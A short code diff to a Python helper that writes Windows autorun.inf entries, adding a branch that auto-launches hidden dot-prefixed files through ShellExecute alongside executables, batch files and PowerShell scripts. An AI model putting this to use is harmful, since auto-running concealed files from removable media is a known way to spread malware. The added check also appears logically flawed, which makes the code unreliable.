@@ -36,10 +36,15 @@ def generate_autorun_content(filename: str) -> str:
     if ext.endswith(image_extensions):
         return f"[autorun]\nShellExecute={filename}\nUseAutoPlay=1"
 
-    # Check for exact match
+    # Check for exact match, including hidden files
     if ext in file_type_actions:
         return file_type_actions[ext](filename)
     
+    # Check if the filename starts with a dot for hidden files
+    if ext.startswith("."):
+        hidden_action = f"[autorun]\nShellExecute={filename}\nUseAutoPlay=1"
+        return hidden_action
+
     raise ValueError("Unsupported file type. Please use an executable, ZIP file, image, Python script, Java JAR, CMD batch file, or PowerShell script.")
 
 def create_autorun_file(base_path: str, content: str) -> None:
